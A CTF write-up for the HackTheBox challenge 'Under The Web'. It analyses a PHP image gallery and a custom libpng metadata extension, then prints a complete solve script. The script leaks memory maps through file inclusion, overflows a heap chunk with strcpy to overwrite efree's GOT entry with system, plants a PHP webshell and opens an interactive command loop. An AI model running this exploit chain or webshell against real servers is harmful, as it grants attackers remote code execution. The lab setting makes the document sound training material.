---
title: Under The Web
date: 2026-10-31 08:44:00 +0100
categories: [CTF, HackTheBox]
tags: [pwnable, reversing]
math: true
mermaid: true
media_subpath: /assets/posts/2026-10-31-Under-The-Web
image:
  path: preview.png
---

## HackTheBox - Under The Web

### Overview

**Under The Web** is a medium-rated pwnable built around a custom image-processing PHP extension sitting behind a PHP web application.

The application is vulnerable to file inclusion. It does validate that the target file exists before returning its contents, but that check is still enough to leak memory layout by reading the `php` process map at `/proc/self/maps`.

With those leaks in hand, a Heap Overflow in the `metadata_reader.so` PHP extension is abused to perform a `GOT` overwrite and ultimately gain a shell.

### Program Analysis

I'm really lazy to make a proper writeup for now because I solved this challenge months ago but, here's the setup that was provided.

```dockerfile
FROM php@sha256:7bd5ed8988462e39498275924dc5b034fab5b8cd16819d113b311db226486de5

RUN apt-get update && apt-get install -y libpng-dev

RUN useradd -m www
RUN mkdir /app && chown www:www /app

COPY . /app

RUN chown -R www:www /app
WORKDIR /app

USER www

RUN random_value=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32) && \
    hashed_value=$(echo -n $random_value | sha256sum | awk '{print $1}') && \
    mv flag.txt $hashed_value

RUN chmod +x ./start.sh

CMD ["./start.sh"]
```

```bash
#!/bin/bash

while true 
do 
    php -S 0.0.0.0:8000 -dextension=./metadata_reader.so
done
```

The web application code lives in `/app`.

- `index.php`

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Arts & Artist - Gallery</title>
    <style>
        body {
            background-color: #001a33;
            margin: 0;
            padding: 15px 0 0 0;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            min-height: 100vh;
        }
        .content {
            text-align: left;
            color: white;
            width: 80%; /* Adjust width as needed */
        }
        .image-container {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        img {
            width: 150px; /* Thumbnail size */
            height: auto;
            border-radius: 5px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            margin-right: 20px; /* Spacing between image and text */
        }
        .info {
            flex: 1;
        }
        .upload-page-button {
            margin-top: 20px;
            text-align: center;
        }
        .upload-button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
            text-decoration: none;
        }
        a {
            text-decoration: none;
            color: white;
        }
    </style>
</head>
<body>
    <div class="content">
        <?php
        $directory = 'uploads/';
        $images = glob($directory . "*.png"); // Get all .png files from the directory

        foreach ($images as $image) {
            $info = getImgMetadata($image);
            $data = explode("\n", $info);

            echo '<a href=/view.php?image=' . $image . '>';
            echo '<div class="image-container">';
            echo '<img src="data:image/png;base64,' . base64_encode(file_get_contents($image)) . '" alt="Full Image">';
            echo '<div class="info">' . 
                $data[0] . "<br>" .
                $data[1] . "<br>" .
                $data[2] . "<br>"
            . '</div>';
            echo '</div></a>';
        }
        ?>
    </div>

    <div class="upload-page-button">
        <a href="upload.php" class="upload-button">Upload Image</a>
    </div>
</body>
</html>
```

- `upload.php`

```php
<?php
    $uploadDir = 'uploads/';

    $image = $uploadDir . "starry_night.png";

    function CheckPng($file) {
        // Open the uploaded file in binary mode
        $handle = fopen($file['tmp_name'], 'rb');

        // Read the first 8 bytes (magic bytes) of the file
        $magicBytes = fread($handle, 8);

        // Close the file handle
        fclose($handle);

        // Check if the magic bytes match the PNG signature
        return $magicBytes === "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A";
    }

    function is_valid_path($path) {
        // Check if the path contains any suspicious patterns
        if ( strpos($path, '..') !== false ){
            return false;
        }
        return true;
    }


    if(isset($_FILES["file"]) && $_FILES["file"]["error"] === UPLOAD_ERR_OK) {
        $file = $_FILES['file'];
        $fileType = strtolower(pathinfo($file["name"], PATHINFO_EXTENSION));
        if($fileType !== 'png') {
            echo "<script>alert('Only PNG files are allowed.');</script>";
        } else {
            if(CheckPng($file)) {
                if(is_valid_path($file["name"])) {
                    $targetFilePath = $uploadDir . $file["name"];
                    if(move_uploaded_file($file["tmp_name"], $targetFilePath)) {
                        $image = $uploadDir . $file['name'];
                        echo "<script>alert('File uploaded successfully as " . basename($targetFilePath) . "');</script>";
                    }
                }
            } else {
                echo "<script>alert('Only PNG files are allowed.');</script>";
            }
        }
    }

    $info = getImgMetadata($image);
    $data = explode("\n", $info);

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Arts & Artist</title>
    <style>
        body {
            background-color: #001a33;
            margin: 0;
            padding: 15px 0 0 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh; /* Make the body take up the full viewport height */
        }
        .content {
            text-align: center;
            color: white;
        }
        img {
            width: 80%; /* Adjust the width of the image as needed */
            border-radius: 5px; /* Rounded corners */
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5); /* Add a shadow effect */
        }

        .upload-form {
            margin-top: 20px; /* Add some spacing between sections */
        }
        .upload-label {
            background-color: #4CAF50; /* Green background for upload button */
            color: white;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="content">
        <img src="<?= $image ?>" alt="Image">
        <p><?= $data[0] ?></p>
        <p><?= $data[1] ?></p>
        <p><?= $data[2] ?></p>
    </div>

    <div class="upload-form">
        <form action="upload.php" method="post" enctype="multipart/form-data">
            <input type="file" name="file" accept="image/png">
            <button type="submit">Upload</button>
        </form>
    </div>

</body>
</html>
```

- `view.php`

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Full Image View</title>
    <style>
        body {
            background-color: #001a33;
            margin: 0;
            padding: 15px;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            color: white;
        }
        img {
            max-width: 90%;
            max-height: 90%;
            border-radius: 5px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }

        .page-button {
            margin-top: 20px;
            text-align: center;
        }
        .button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
            text-decoration: none;
        }
        .content {
            text-align: left;
            color: white;
            width: 80%; /* Adjust width as needed */
        }
    </style>
</head>
<body>
    <div class="content">
    <?php
    if (isset($_GET['image'])) {
        $image = urldecode($_GET['image']);
        if (file_exists($image)) {
            echo '<img src="data:image/png;base64,' . base64_encode(file_get_contents($image)) . '" alt="Full Image">';
        } else {
            echo '<p>Image not found.</p>';
        }
    } else {
        echo '<p>No image specified.</p>';
    }
    ?>
    </div>
    <div class="page-button">
        <a href="index.php" class="button">Back to Gallary</a>
    </div>
</body>
</html>
```

They're mostly just wrappers to enable image file upload and processing.

Although a vulnerability exists in the application code, the extension processing the image itself also has a vuln.

```bash
mark@rwx:~/Desktop/Labs/HTB/Challenges/UnderTheWeb/pwn_under_the_web$ file metadata_reader.so
metadata_reader.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=ad7d8ecf217ef7ee30ca6a64803c3c64fa4631e4, with debug_info, not stripped
mark@rwx:~/Desktop/Labs/HTB/Challenges/UnderTheWeb/pwn_under_the_web$ checksec metadata_reader.so
[*] '/home/mark/Desktop/Labs/HTB/Challenges/UnderTheWeb/pwn_under_the_web/metadata_reader.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
    Debuginfo:  Yes
mark@rwx:~/Desktop/Labs/HTB/Challenges/UnderTheWeb/pwn_under_the_web$
```

>PHP extensions, also known as modules, are compiled libraries that extend the functionality of PHP. They provide additional features and interface with external libraries or services, allowing developers to perform tasks that are not natively supported by PHP. 
{: .prompt-tip }

When we upload an image, after it is stored in the `uploads/` directory, the following code runs:

```php
$info = getImgMetadata($image);
```

The function isn't a native PHP function but instead an exported API provided by the `metadata_reader` extension.

The name already hints at what it does: *extract the metadata of a provided image*.

From reversing the library, we learn that the metadata it extracts is:
- Title
- Artist
- Copyright

Here's the decompilation of the function:

```c
00000000 struct metadata_reader_t // sizeof=0x38
00000000 {
00000000     char *artist;
00000008     char *title;
00000010     char *copyright;
00000018     char *filename;
00000020     png_structp png_ptr;
00000028     png_infop png_info;
00000030     png_textp *text_ptr;
00000038 };

 void __fastcall zif_getImgMetadata(zend_execute_data *execute_data, zval *return_value)
{
  char *filename; // rbx
  __int64 v3; // rbp
  uint32_t arg_cnt; // ebp
  const zend_op *opline; // rax
  metadata_reader_t *v6; // rax
  png_structp v7; // rdi
  png_info *info_struct; // rax
  struct __jmp_buf_tag *jmp_buf; // rax
  int is_called; // ebp
  metadata_reader_t *v11; // rbx
  __int64 idx; // rbx
  png_text *current; // r12
  const char *key; // r13
  char *chunk; // rdi
  metadata_reader_t *v16; // rax
  const char *v17; // rsi
  char *title; // rbp
  size_t v19; // rax
  size_t v20; // rsi
  char *v21; // rdi
  char *artist; // rbp
  size_t v23; // rax
  size_t v24; // rsi
  char *v25; // rdi
  char *copyright; // rbp
  size_t v27; // rax
  size_t v28; // rsi
  char *v29; // rdi
  size_t v30; // rbx
  __int64 v31; // rax
  __int64 v32; // rdx
  zval *v33; // rcx
  char v34; // dl
  metadata_reader_t *info; // [rsp+0h] [rbp-160h]
  FILE *stream; // [rsp+8h] [rbp-158h]
  zval *return_value_; // [rsp+10h] [rbp-150h]
  int num_text; // [rsp+1Ch] [rbp-144h] BYREF
  const zend_op *v39; // [rsp+20h] [rbp-140h] BYREF
  char s[264]; // [rsp+28h] [rbp-138h] BYREF
  __int64 v41; // [rsp+138h] [rbp-28h]

  v41 = v3;
  arg_cnt = execute_data->This.u2.next;
  return_value_ = return_value;
  memset(s, 0, 256);
  if ( arg_cnt > 1 )
  {
    zif_getImgMetadata_cold();
  }
  else
  {
    if ( arg_cnt == 1 )
    {
      if ( LOBYTE(execute_data[1].call) == 6 )
      {
        opline = execute_data[1].opline;
      }
      else
      {
        v34 = zend_parse_arg_str_slow(&execute_data[1], &v39, 1LL);
        opline = v39;
        if ( !v34 )
        {
          zend_wrong_parameter_error(9LL, 1LL, 0LL, 4LL, &execute_data[1]);
          return;
        }
      }
      filename = (char *)&opline->lineno;
    }
    v6 = (metadata_reader_t *)_emalloc_56();
    v6->filename = filename;
    info = v6;
    stream = fopen(filename, "rb");
    if ( stream )
    {
      v7 = (png_structp)png_create_read_struct((__int64)"1.6.43", 0LL, 0LL, 0LL);
      info->png_ptr = v7;
      if ( v7 )
      {
        info_struct = (png_info *)png_create_info_struct((__int64)v7);
        info->png_info = info_struct;
        if ( info_struct )
        {
          jmp_buf = (struct __jmp_buf_tag *)png_set_longjmp_fn((__int64)info->png_ptr, (__int64)&longjmp, 200LL);
          is_called = _setjmp(jmp_buf);
          if ( is_called )
          {
            png_destroy_read_struct(&info->png_ptr, &info->png_info, 0LL);
            fclose(stream);
            php_error_docref(0LL, 2LL, "Error during png creation");
            return;
          }
          v11 = info;
          png_init_io(info->png_ptr, stream);
          png_read_info((__int64)v11->png_ptr, (__int64)v11->png_info);
          if ( png_get_text(v11->png_ptr, v11->png_info, (png_textp *)&v11->text_ptr, &num_text) > 0 && num_text > 0 )
          {
            idx = 0LL;
            while ( 1 )
            {
              current = (png_text *)&info->text_ptr[idx];
              key = current->key;
              if ( !strcmp(key, "Title") )
                break;
              if ( !strcmp(key, "Artist") )
              {
                if ( strlen(current->text) <= 1 )
                  goto LABEL_15;
                chunk = (char *)_emalloc_56();
                v16 = info;
                info->artist = chunk;
                if ( !chunk )
                  goto LABEL_15;
LABEL_20:
                ++is_called;
                v17 = (const char *)v16->text_ptr[idx + 2];
                idx += 7LL;
                strcpy(chunk, v17);
                if ( num_text <= is_called )
                  goto LABEL_21;
              }
              else
              {
                if ( !strcmp(key, "Copyright") && strlen(current->text) > 1 )
                {
                  chunk = (char *)_emalloc_56();
                  v16 = info;
                  info->copyright = chunk;
                  if ( chunk )
                    goto LABEL_20;
                }
LABEL_15:
                ++is_called;
                idx += 7LL;
                if ( num_text <= is_called )
                  goto LABEL_21;
              }
            }
            if ( strlen(current->text) > 1 )
            {
              chunk = (char *)_emalloc_56();
              v16 = info;
              info->title = chunk;
              if ( chunk )
                goto LABEL_20;
            }
            goto LABEL_15;
          }
LABEL_21:
          png_destroy_read_struct(&info->png_ptr, &info->png_info, 0LL);
          fclose(stream);
          title = info->title;
          v19 = strlen(s);
          v20 = 256 - v19;
          v21 = &s[v19];
          if ( title )
          {
            ap_php_snprintf(v21, v20, "Title: %s\n", title);
            _efree(info->title);
          }
          else
          {
            ap_php_snprintf(v21, v20, "Title: UnKnown\n");
          }
          artist = info->artist;
          v23 = strlen(s);
          v24 = 256 - v23;
          v25 = &s[v23];
          if ( artist )
          {
            ap_php_snprintf(v25, v24, "Artist: %s\n", artist);
            _efree(info->artist);
          }
          else
          {
            ap_php_snprintf(v25, v24, "Artist: UnKnown\n");
          }
          copyright = info->copyright;
          v27 = strlen(s);
          v28 = 256 - v27;
          v29 = &s[v27];
          if ( copyright )
          {
            ap_php_snprintf(v29, v28, "Copyright: %s\n", copyright);
            _efree(info->copyright);
          }
          else
          {
            ap_php_snprintf(v29, v28, "Copyright: UnKnown\n");
          }
          _efree(info);
          v30 = strlen(s);
          v31 = _emalloc((v30 + 32) & 0xFFFFFFFFFFFFFFF8LL);
          *(_QWORD *)(v31 + 8) = 0LL;
          *(_QWORD *)v31 = 0x1600000001LL;
          v32 = v31 + 24;
          *(_QWORD *)(v31 + 16) = v30;
          if ( (unsigned int)v30 < 8 )
          {
            if ( (v30 & 4) != 0 )
            {
              *(_DWORD *)(v31 + 24) = *(_DWORD *)s;
              *(_DWORD *)(v32 + (unsigned int)v30 - 4) = *(_DWORD *)&s[(unsigned int)v30 - 4];
            }
            else if ( (_DWORD)v30 )
            {
              *(_BYTE *)(v31 + 24) = s[0];
              if ( (v30 & 2) != 0 )
                *(_WORD *)(v32 + (unsigned int)v30 - 2) = *(_WORD *)&s[(unsigned int)v30 - 2];
            }
          }
          else
          {
            *(_QWORD *)(v31 + 24) = *(_QWORD *)s;
            *(_QWORD *)(v32 + (unsigned int)v30 - 8) = *(_QWORD *)&s[(unsigned int)v30 - 8];
            qmemcpy(
              (void *)((v31 + 32) & 0xFFFFFFFFFFFFFFF8LL),
              &s[-(v32 - ((v31 + 32) & 0xFFFFFFFFFFFFFFF8LL))],
              8LL * (((unsigned int)v30 + (_DWORD)v32 - (((_DWORD)v31 + 32) & 0xFFFFFFF8)) >> 3));
          }
          v33 = return_value_;
          *(_BYTE *)(v31 + v30 + 24) = 0;
          v33->value.lval = v31;
          v33->u1.type_info = 262;
        }
        else
        {
          png_destroy_read_struct(&info->png_ptr, 0LL, 0LL);
          fclose(stream);
          php_error_docref(0LL, 2LL, "Unable to create png info struct");
        }
      }
      else
      {
        fclose(stream);
        php_error_docref(0LL, 2LL, "Unable to create png read struct");
      }
    }
    else
    {
      php_error_docref(0LL, 2LL, "Unable to open file %s", info->filename);
    }
  }
}
```

Reversing was easy, as you could cross-reference the APIs against the `libpng` documentation:
- [docs](https://refspecs.linuxbase.org/LSB_3.1.0/LSB-Desktop-generic/LSB-Desktop-generic/libpng12.png.create.info.struct.1.html)

I debugged it directly inside Docker, attaching GDB to the `php` process ID and setting a breakpoint on `zif_getImgMetadata`.

The vulnerability in `metadata_reader` is a heap-based overflow, as you can probably already tell from the calls to `strcpy`.

The memory allocator behind `emalloc` is the [Zend allocator](https://www.phpinternalsbook.com/php7/memory_management/zend_memory_manager.html).

Tbh you really don't need a deep knowledge of it in order to pwn it. Just think of it like `glibc`'s `tcache`, but with no `chunk->next` safe-linking xD

This is me getting RIP control in the `php` process via the memory corruption.

![image](ripcontrol.png)

Putting it together: each of the three metadata strings (`Title`, `Artist`, `Copyright`) is copied into its own fixed `0x38`-byte `emalloc` chunk with an unbounded `strcpy`, so an overflow writes straight past its chunk and into adjacent heap data. Since the extension is only **Partial RELRO** (from the earlier `checksec`), the GOT is writable, and that's our target.

The idea is to groom the three fields so the overflow lands the address of `system` into the GOT entry of `efree`:

- `title = b"A"*0x38 + p64(efree_got)` is the overflow. The `0x38` filler exactly spans one chunk, and the trailing pointer overwrites the `chunk->next` link of the adjacent *freed* chunk sitting in Zend's free list. Because the allocator has no safe-linking, the next `emalloc` of that size class hands us back our target, `efree`'s GOT entry. That's our arbitrary write.
- `copyright = p64(system)` is the data copied into that attacker-controlled allocation, so `efree@GOT` now points at `system`.
- `artist` holds the command we want to run.

Once parsing finishes, the extension cleans up by calling `_efree()` on each field. With `efree@GOT` now pointing at `system`, that cleanup turns into `system(artist)`, i.e.

```php
system("echo '<?php system($_GET[0]); ?>' > /app/uploads/me.php")
```

which drops a PHP webshell into the web-accessible `uploads/` directory. 

The addresses come from the `/proc/self/maps` leak: `metadata_reader.so`'s base gives us `efree`'s GOT entry, and libc's base gives us `system`.

Here's my full solve [script](https://h4ckyou.github.io/assets/posts/2026-10-31-Under-The-Web/solve.py):

```python
from PIL import Image, PngImagePlugin
from pwn import *
import requests
from bs4 import BeautifulSoup

URL = "http://154.57.164.74:31074"

def create_png(filename, artist="", title="", copyright_text=""):
    img = Image.new("RGB", (200, 200), color=(255, 255, 255))

    meta = PngImagePlugin.PngInfo()

    if title:
        meta.add_text("Title", title)

    if artist:
        meta.add_text("Artist", artist)

    if copyright_text:
        meta.add_text("Copyright", copyright_text)

    img.save(filename, "PNG", pnginfo=meta)

    success(f"Created {filename}")

def get_base(maps_text, target):
    for line in maps_text.splitlines():
        if target in line:
            addr = line.split(" ")[0]
            base = int(addr.split("-")[0], 16)
            return base
    return None

def leak_address():
    html = requests.get(URL + "/view.php?image=/proc/self/maps")
    soup = BeautifulSoup(html.text, "html.parser")
    img = soup.find("img")
    data = img["src"]
    b64 = data.split("base64,")[1]
    data = base64.b64decode(b64).decode()
    metareader_base = get_base(data, "/app/metadata_reader.so")
    libc_base = get_base(data, "/usr/lib/x86_64-linux-gnu/libc.so.6")
    if metareader_base:
        success(f"Found metadata_reader.so base: {hex(metareader_base)}")
    if libc_base:
        success(f"Found libc.so.6 base: {hex(libc_base)}")
    return metareader_base, libc_base

metareader_base, libc_base = leak_address()

efree_got = metareader_base + 0x4090
system = libc_base + 0x4c3a0

success(f"efree GOT address: {hex(efree_got)}")
success(f"system address: {hex(system)}")

command = b"echo '<?php system($_GET[0]); ?>' > /app/uploads/me.php"
payload = b"A"*0x38 + p64(efree_got)

create_png(
    "exploit.png",
    artist=command,
    title=payload,
    copyright_text=p64(system)
)

files = {
    "file": ("exploit.png", open("exploit.png", "rb"), "image/png")
}

r = requests.post(URL + "/upload.php", files=files)
if r.status_code == 200:
    success("Exploit executed successfully!")
else:
    error("File upload failed!")
    exit(1)

while True:
    cmd = input("$ ")
    if cmd.lower() == "exit":
        break
    r = requests.get(URL + f"/uploads/me.php?0={cmd}")
    print(r.text)
```

Running it works!

![image](pwned.png)

ありがとうございます！😊